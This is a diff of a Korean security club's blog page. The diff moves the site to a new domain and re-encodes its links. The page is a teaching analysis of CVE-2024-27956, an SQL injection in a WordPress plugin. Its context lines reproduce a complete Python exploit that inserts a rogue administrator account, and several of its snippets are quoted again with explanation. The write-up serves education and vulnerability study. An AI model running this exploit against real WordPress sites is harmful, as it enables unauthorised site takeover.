@@ -5,10 +5,11 @@
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/swing_logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/swing_logo.png" color="#222">
+  <meta name="google-site-verification" content="uoL1t-yrbhPowL65E-xnG5D1FNLOwghJsIG6iqHrEsc">
 
 <link rel="stylesheet" href="/css/main.css">
 
@@ -17,33 +18,33 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"swu-swing.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"log.swuswing.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":true,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
 
     <meta name="description" content="들어가며이번 32기 지원서는 상중하 주제 중에 하나를 선택해서 공부한대로 적는 라이트업 문제가 있었다.  상 문제만 유일하게 CVE 분석이다. 주제가 어려웠는지 아무도 상 문제를 적진 않았지만(…) SWING 들어와서 공부하면 그만이다. 입학 시절로 돌아가 취약점 분석에 대한 0부터 적어보자. 목표는 신규 학회원들이 이 글만 읽어도 다 이해할 수 있는">
 <meta property="og:type" content="article">
 <meta property="og:title" content="지원서 뜯어보기 [상] CVE-2024-27956 분석">
-<meta property="og:url" content="https://swu-swing.github.io/2025/04/03/3101_250402/index.html">
+<meta property="og:url" content="https://log.swuswing.com/2025/04/03/3101_250402/index.html">
 <meta property="og:site_name" content="SW1NGL0G">
 <meta property="og:description" content="들어가며이번 32기 지원서는 상중하 주제 중에 하나를 선택해서 공부한대로 적는 라이트업 문제가 있었다.  상 문제만 유일하게 CVE 분석이다. 주제가 어려웠는지 아무도 상 문제를 적진 않았지만(…) SWING 들어와서 공부하면 그만이다. 입학 시절로 돌아가 취약점 분석에 대한 0부터 적어보자. 목표는 신규 학회원들이 이 글만 읽어도 다 이해할 수 있는">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://swu-swing.github.io/images/3101_250403_image1.png">
-<meta property="og:image" content="https://swu-swing.github.io/images/3101_250403_image2.png">
-<meta property="og:image" content="https://swu-swing.github.io/images/3101_250403_image3.png">
-<meta property="og:image" content="https://swu-swing.github.io/images/3101_250403_image4.png">
-<meta property="og:image" content="https://swu-swing.github.io/images/3101_250403_image5.png">
+<meta property="og:image" content="https://log.swuswing.com/images/3101_250403_image1.png">
+<meta property="og:image" content="https://log.swuswing.com/images/3101_250403_image2.png">
+<meta property="og:image" content="https://log.swuswing.com/images/3101_250403_image3.png">
+<meta property="og:image" content="https://log.swuswing.com/images/3101_250403_image4.png">
+<meta property="og:image" content="https://log.swuswing.com/images/3101_250403_image5.png">
 <meta property="article:published_time" content="2025-04-03T01:00:00.000Z">
 <meta property="article:modified_time" content="2025-07-14T17:13:35.948Z">
 <meta property="article:author" content="SWING">
 <meta property="article:tag" content="Web Hacking">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://swu-swing.github.io/images/3101_250403_image1.png">
+<meta name="twitter:image" content="https://log.swuswing.com/images/3101_250403_image1.png">
 
 
-<link rel="canonical" href="https://swu-swing.github.io/2025/04/03/3101_250402/">
+<link rel="canonical" href="https://log.swuswing.com/2025/04/03/3101_250402/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://swu-swing.github.io/2025/04/03/3101_250402/","path":"2025/04/03/3101_250402/","title":"지원서 뜯어보기 [상] CVE-2024-27956 분석"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://log.swuswing.com/2025/04/03/3101_250402/","path":"2025/04/03/3101_250402/","title":"지원서 뜯어보기 [상] CVE-2024-27956 분석"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
 <title>지원서 뜯어보기 [상] CVE-2024-27956 분석 | SW1NGL0G</title>
@@ -124,7 +125,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -135,20 +136,20 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-count">17</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
 </div>
   <div class="links-of-author animated">
       <span class="links-of-author-item">
-        <a href="mailto:swu.swing@gmail.com" title="E-Mail → mailto:swu.swing@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+        <span class="exturl" data-url="bWFpbHRvOnN3dS5zd2luZ0BnbWFpbC5jb20=" title="E-Mail → mailto:swu.swing@gmail.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
       </span>
       <span class="links-of-author-item">
-        <a href="https://www.facebook.com/@swuswing" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;@swuswing" rel="noopener me" target="_blank"><i class="fab fa-facebook fa-fw"></i>FB Page</a>
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0Bzd3Vzd2luZw==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;@swuswing"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
       </span>
       <span class="links-of-author-item">
-        <a href="https://www.instagram.com/swing_swu" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;swing_swu" rel="noopener me" target="_blank"><i class="fab fa-instagram fa-fw"></i>Instagram</a>
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS9zd2luZ19zd3U=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;swing_swu"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
       </span>
   </div>
 
@@ -164,7 +165,7 @@
         </div>
         <ul class="links-of-blogroll-list">
             <li class="links-of-blogroll-item">
-              <a href="https://swuswing.com/" title="https:&#x2F;&#x2F;swuswing.com&#x2F;" rel="noopener" target="_blank">SWING Official Website</a>
+              <span class="exturl" data-url="aHR0cHM6Ly9zd3Vzd2luZy5jb20v" title="https:&#x2F;&#x2F;swuswing.com&#x2F;">SWING Official Website</span>
             </li>
         </ul>
       </div>
@@ -185,7 +186,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://swu-swing.github.io/2025/04/03/3101_250402/">
+    <link itemprop="mainEntityOfPage" href="https://log.swuswing.com/2025/04/03/3101_250402/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -297,7 +298,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeRequest</span>(<span class="params">payload, <span class="built_in">hash</span>, url</span>):</span><br><span class="line">    host = url.split(<span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: host,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: payload,</span><br><span class="line">    <span class="string">&#x27;auth&#x27;</span>: <span class="string">b&#x27;\0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;integ&#x27;</span>: <span class="built_in">hash</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpUsage</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] You must run the expoit passing the wordpress URL. \n[+] Example: python exploit.py http://website.com&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verifyArgs</span>(<span class="params">argv</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        helpUsage()</span><br><span class="line"></span><br><span class="line">verifyArgs(sys.argv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit for CVE-2024-27956&quot;</span>)</span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line">url = domain+<span class="string">&#x27;/wp-content/plugins/wp-automatic/inc/csv.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#first request (create user)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Creating user eviladmin&quot;</span>)</span><br><span class="line">response = makeRequest(<span class="string">&quot;INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES (&#x27;eviladmin&#x27;, &#x27;$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0&#x27;, &#x27;eviladmin&#x27;, &#x27;eviladmin@gmail.com&#x27;, &#x27;http://127.0.0.1:8080&#x27;, &#x27;2025-04-05 17:31:03&#x27;, 0, &#x27;eviladmin&#x27;)&quot;</span>, <span class="string">&quot;09956ea086b172d6cf8ac31de406c4c0&quot;</span>, url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Tampered query&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;invalid login&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;login required&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Error in the payload&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;DATE&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Not vulnerable&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="comment">#second request (give permission)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Giving eviladmin administrator permissions&quot;</span>)</span><br><span class="line">makeRequest(<span class="string">&quot;INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ((SELECT ID FROM wp_users WHERE user_login = &#x27;eviladmin&#x27;), &#x27;wp_capabilities&#x27;, &#x27;a:1:&#123;s:13:\&quot;administrator\&quot;;s:1:\&quot;1\&quot;;&#125;&#x27;)&quot;</span>, <span class="string">&quot;bd98494b41544b818fa9f583dadfa2bb&quot;</span>, url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Tampered query&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;invalid login&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;login required&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Error in the payload&quot;</span>)</span><br><span class="line">    quit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit completed!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] administrator created: eviladmin:admin&quot;</span>)</span><br></pre></td></tr></table></figure>
 <p>exploit.py 전체 코드이다. diego-tella 깃허브에서 가져왔다(아래 참고문헌에 url 존재)<br>코드를 부분부분 뜯어서 자세히 살펴보자. </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">verifyArgs(sys.argv)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Exploit for CVE-2024-27956&quot;</span>)</span><br><span class="line">domain = sys.argv[<span class="number">1</span>]</span><br><span class="line">url = domain+<span class="string">&#x27;/wp-content/plugins/wp-automatic/inc/csv.php&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>먼저 취약한 위치로 url을 설정한다. domain은 <code>argv[1]</code>으로 설정되어 있는데 실행할 때 넣어주는 인자값을 말한다. Usage가 python exploit.py ‘<a target="_blank" rel="noopener" href="http://website.com'라고/">http://website.com&#39;라고</a> 하면 여기서 argv[1]은 ‘<a target="_blank" rel="noopener" href="http://website.com'이다/">http://website.com&#39;이다</a>. </p>
+<p>먼저 취약한 위치로 url을 설정한다. domain은 <code>argv[1]</code>으로 설정되어 있는데 실행할 때 넣어주는 인자값을 말한다. Usage가 python exploit.py ‘<span class="exturl" data-url="aHR0cDovL3dlYnNpdGUuY29tJ+udvOqzoC8=">http://website.com&#39;라고</span> 하면 여기서 argv[1]은 ‘<span class="exturl" data-url="aHR0cDovL3dlYnNpdGUuY29tJ+ydtOuLpC8=">http://website.com&#39;이다</span>. </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#first request (create user)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Creating user eviladmin&quot;</span>)</span><br><span class="line">response = makeRequest(<span class="string">&quot;INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name) VALUES (&#x27;eviladmin&#x27;, &#x27;$P$BASbMqW0nlZRux/2IhCw7AdvoNI4VT0&#x27;, &#x27;eviladmin&#x27;, &#x27;eviladmin@gmail.com&#x27;, &#x27;http://127.0.0.1:8080&#x27;, &#x27;2025-04-05 17:31:03&#x27;, 0, &#x27;eviladmin&#x27;)&quot;</span>, <span class="string">&quot;09956ea086b172d6cf8ac31de406c4c0&quot;</span>, url)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;Tampered query&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;invalid login&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;login required&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Error in the payload&quot;</span>)</span><br><span class="line">    quit()</span><br></pre></td></tr></table></figure>
 <p>첫번째 Request이다. user를 추가하는 SQL injection을 넣어서 보낸다. </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">makeRequest</span>(<span class="params">payload, <span class="built_in">hash</span>, url</span>):</span><br><span class="line">    host = url.split(<span class="string">&#x27;/&#x27;</span>, <span class="number">3</span>)[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: host,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    data = &#123;</span><br><span class="line">    <span class="string">&#x27;q&#x27;</span>: payload,</span><br><span class="line">    <span class="string">&#x27;auth&#x27;</span>: <span class="string">b&#x27;\0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;integ&#x27;</span>: <span class="built_in">hash</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=data, headers=headers)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>
@@ -319,15 +320,15 @@ admin 권한을 받았는지도 확인해보자.
 <br><br>
 
 <h1 id="마치며"><a href="#마치며" class="headerlink" title="마치며"></a>마치며</h1><p>보통 취약점 1-day 분석을 한다고 하면 PoC, Exploit, Patch를 공부한다. Patch는 SW적으로 어떻게 취약점을 방어하는지 공부하기 위함인데 이번 취약점은 <code>inc/csv.php</code>를 제거함으로써 패치하여 추가적인 목차를 만들진 않았다.<br>신입 학회원에게 많은 도움이 되었으면 해서 최대한 자세하게 템포 느리게 적다보니 초고 완성까지 오래 걸린 거 같다(그렇게 오래 걸릴 내용은 아닌 거 같은데..)<br>다음 글은 뭘 적을지 고민해봐야겠다.<br><br><br></p>
-<h1 id="참고-문헌"><a href="#참고-문헌" class="headerlink" title="참고 문헌"></a>참고 문헌</h1><p>보안뉴스. (2015, 6월 16). 국내 보안 위협 동향과 대응 방안. <a target="_blank" rel="noopener" href="https://www.boannews.com/media/view.asp?idx=47656">https://www.boannews.com/media/view.asp?idx=47656</a></p>
-<p>이글루코퍼레이션. (n.d.). WordPress Plug-in에 따른 SQL Injection 분석 및 대응 방안 (CVE-2022-3689, CVE-2023-6360). <a target="_blank" rel="noopener" href="https://www.igloo.co.kr/security-information/wordpress-plug-in%EC%97%90-%EB%94%B0%EB%A5%B8-sql-injection-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88-cve-2022-3689-cve-2023-6360/">https://www.igloo.co.kr/security-information/wordpress-plug-in%EC%97%90-%EB%94%B0%EB%A5%B8-sql-injection-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88-cve-2022-3689-cve-2023-6360/</a></p>
-<p>W3Techs. (n.d.). Usage statistics and market share of WordPress for websites. <a target="_blank" rel="noopener" href="https://w3techs.com/">https://w3techs.com/</a></p>
-<p>위키백과. (n.d.). SQL. <a target="_blank" rel="noopener" href="https://ko.wikipedia.org/wiki/SQL">https://ko.wikipedia.org/wiki/SQL</a></p>
-<p>truonghuuphuc. (2024). CVE-2024-27956. GitHub. <a target="_blank" rel="noopener" href="https://github.com/truonghuuphuc/CVE-2024-27956/tree/main">https://github.com/truonghuuphuc/CVE-2024-27956/tree/main</a></p>
-<p>하온 블로그. (n.d.). SQL Injection이란? 원리, 예시와 방어 방법. <a target="_blank" rel="noopener" href="https://haon.blog/haon/server/sql-injection/">https://haon.blog/haon/server/sql-injection/</a></p>
-<p>Patchstack. (2024, March 20). Critical vulnerabilities patched in WordPress Automatic Plugin. <a target="_blank" rel="noopener" href="https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin?_s_id=cve">https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin?_s_id=cve</a></p>
-<p>diego-tella. (2024). CVE-2024-27956-RCE. GitHub. <a target="_blank" rel="noopener" href="https://github.com/diego-tella/CVE-2024-27956-RCE">https://github.com/diego-tella/CVE-2024-27956-RCE</a></p>
-<p>DreamHost. (n.d.). A Guide to WordPress User Roles and Permissions. <a target="_blank" rel="noopener" href="https://www.dreamhost.com/blog/wordpress-user-roles/">https://www.dreamhost.com/blog/wordpress-user-roles/</a></p>
+<h1 id="참고-문헌"><a href="#참고-문헌" class="headerlink" title="참고 문헌"></a>참고 문헌</h1><p>보안뉴스. (2015, 6월 16). 국내 보안 위협 동향과 대응 방안. <span class="exturl" data-url="aHR0cHM6Ly93d3cuYm9hbm5ld3MuY29tL21lZGlhL3ZpZXcuYXNwP2lkeD00NzY1Ng==">https://www.boannews.com/media/view.asp?idx=47656</span></p>
+<p>이글루코퍼레이션. (n.d.). WordPress Plug-in에 따른 SQL Injection 분석 및 대응 방안 (CVE-2022-3689, CVE-2023-6360). <span class="exturl" data-url="aHR0cHM6Ly93d3cuaWdsb28uY28ua3Ivc2VjdXJpdHktaW5mb3JtYXRpb24vd29yZHByZXNzLXBsdWctaW4lRUMlOTclOTAtJUVCJTk0JUIwJUVCJUE1JUI4LXNxbC1pbmplY3Rpb24tJUVCJUI2JTg0JUVDJTg0JTlELSVFQiVCMCU4Ri0lRUIlOEMlODAlRUMlOUQlOTEtJUVCJUIwJUE5JUVDJTk1JTg4LWN2ZS0yMDIyLTM2ODktY3ZlLTIwMjMtNjM2MC8=">https://www.igloo.co.kr/security-information/wordpress-plug-in%EC%97%90-%EB%94%B0%EB%A5%B8-sql-injection-%EB%B6%84%EC%84%9D-%EB%B0%8F-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88-cve-2022-3689-cve-2023-6360/</span></p>
+<p>W3Techs. (n.d.). Usage statistics and market share of WordPress for websites. <span class="exturl" data-url="aHR0cHM6Ly93M3RlY2hzLmNvbS8=">https://w3techs.com/</span></p>
+<p>위키백과. (n.d.). SQL. <span class="exturl" data-url="aHR0cHM6Ly9rby53aWtpcGVkaWEub3JnL3dpa2kvU1FM">https://ko.wikipedia.org/wiki/SQL</span></p>
+<p>truonghuuphuc. (2024). CVE-2024-27956. GitHub. <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RydW9uZ2h1dXBodWMvQ1ZFLTIwMjQtMjc5NTYvdHJlZS9tYWlu">https://github.com/truonghuuphuc/CVE-2024-27956/tree/main</span></p>
+<p>하온 블로그. (n.d.). SQL Injection이란? 원리, 예시와 방어 방법. <span class="exturl" data-url="aHR0cHM6Ly9oYW9uLmJsb2cvaGFvbi9zZXJ2ZXIvc3FsLWluamVjdGlvbi8=">https://haon.blog/haon/server/sql-injection/</span></p>
+<p>Patchstack. (2024, March 20). Critical vulnerabilities patched in WordPress Automatic Plugin. <span class="exturl" data-url="aHR0cHM6Ly9wYXRjaHN0YWNrLmNvbS9hcnRpY2xlcy9jcml0aWNhbC12dWxuZXJhYmlsaXRpZXMtcGF0Y2hlZC1pbi13b3JkcHJlc3MtYXV0b21hdGljLXBsdWdpbj9fc19pZD1jdmU=">https://patchstack.com/articles/critical-vulnerabilities-patched-in-wordpress-automatic-plugin?_s_id=cve</span></p>
+<p>diego-tella. (2024). CVE-2024-27956-RCE. GitHub. <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RpZWdvLXRlbGxhL0NWRS0yMDI0LTI3OTU2LVJDRQ==">https://github.com/diego-tella/CVE-2024-27956-RCE</span></p>
+<p>DreamHost. (n.d.). A Guide to WordPress User Roles and Permissions. <span class="exturl" data-url="aHR0cHM6Ly93d3cuZHJlYW1ob3N0LmNvbS9ibG9nL3dvcmRwcmVzcy11c2VyLXJvbGVzLw==">https://www.dreamhost.com/blog/wordpress-user-roles/</span></p>
 
     </div>
 
@@ -379,7 +380,7 @@ admin 권한을 받았는지도 확인해보자.
     </span>
     <span class="author" itemprop="copyrightHolder">SWING</span>
   </div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
   </div>
 
     </div>
